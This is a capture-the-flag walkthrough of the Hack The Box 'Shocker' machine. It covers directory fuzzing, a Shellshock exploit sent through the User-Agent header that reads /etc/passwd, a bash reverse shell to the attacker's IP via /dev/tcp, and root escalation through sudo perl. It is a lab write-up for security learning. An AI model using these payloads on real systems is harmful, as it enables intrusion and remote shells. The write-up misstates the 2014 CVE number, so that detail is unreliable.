## Shocker 

### Lab Details 

- Difficulty: Easy
- Type: apache cgi, sudo, Priv Esc, Linux
- For more detail on this Lab, recommend to check out HTB Academy - Attacking Common Application - Common Gateway Interfaces module as this module goes in details of how this attack works - FYI


#### Tasks
Q1:How many TCP ports are listening on Shocker?
 - `nmap -sT -T4 -vv -A -p- -oA Shocker 10.10.10.56`, port 80(http) and port 2222 (SSH)
 - refer to `Shocker.nmap` for full details

Q2:What is the name of the directory available on the webserver that is a standard name known for running scripts via the Common Gateway Interface?
 - run ffuf on target we found there is a `/cgi-bin` directory 
```
ffuf -u http://10.10.10.56/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .sh            

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .sh 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 306ms]
    * FUZZ: cgi-bin/

[Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 305ms]
    * FUZZ: index.html

[Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 307ms]
    * FUZZ: server-status

:: Progress: [9228/9228] :: Job [1/1] :: 126 req/sec :: Duration: [0:01:12] :: Errors: 0 ::
```
Q3: What is the name of the script in the cgi-bin directory?
- cgi can be a program or script that is used to fetch dynamic content from server 
- try to enumerate programming files such as .pl .py .sh .cgi 
```
ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .sh 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .sh 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 309ms]
    * FUZZ: 

[Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 316ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 317ms]
    * FUZZ: .htaccess

[Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 317ms]
    * FUZZ: .hta.sh

[Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 317ms]
    * FUZZ: .htpasswd.sh

[Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 318ms]
    * FUZZ: .hta

[Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 318ms]
    * FUZZ: .htaccess.sh

[Status: 200, Size: 118, Words: 18, Lines: 8, Duration: 320ms]
    * FUZZ: user.sh

:: Progress: [9228/9228] :: Job [1/1] :: 127 req/sec :: Duration: [0:01:17] :: Errors: 0 ::
```
Q4:What 2014 CVE ID describes a remote code execution vulnerability in Bash when invoked through Apache CGI?
- search for 2014 Apache CGI 
- CVE-2024-6271

Q5:What user is the webserver running as on Shocker?
- we can try to exploit shellshock by injecting command in User-Agent field in request header
```
$: curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.10.10.56/cgi-bin/user.sh

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
```
- reverse shell below
```
$: curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.27/9001 0>&1' http://10.10.10.56/cgi-bin/user.sh
```
- user is shelly

Q6: Submit the flag located in the shelly user's home directory.
- cat /home/shelly/user.txt

Q7: Which binary can the shelly user can run as root on Shocker?
 - check with `sudo -l`
 - we can run perl as root without password 
 - according to gtfo.bin https://gtfobins.github.io/gtfobins/perl/
 - we can run perl as root to execute bash to gain a root shell
 - `cat /root/root.txt` -> flag




#### Lesson Learned
